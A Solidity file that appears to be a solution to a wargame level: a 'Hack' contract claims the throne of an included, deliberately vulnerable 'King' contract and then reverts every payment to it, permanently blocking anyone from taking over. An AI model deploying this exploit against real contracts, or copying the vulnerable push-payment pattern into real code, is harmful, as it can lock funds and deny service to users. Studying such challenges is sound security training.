// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
constructor(address payable target) payable {
    uint prize = King(target).prize();
       (bool ok,) = target.call{value: prize}("");
        require(ok, "tx failed");
    }
fallback() external payable {

    revert();
}

function withdraw() external {
       payable(msg.sender).transfer(address(this).balance);
   }


}


contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(msg.sender);
    king = payable(msg.sender);
    prize = msg.value;
  }

  receive() external payable {
    _becomeKing();
  }

  function becomeKing() external payable {
    _becomeKing();
  }

  function _becomeKing() internal {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); //transfer method sends the specified amount of Ether and reverts the transaction if the transfer fails
    king = payable(msg.sender);
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}


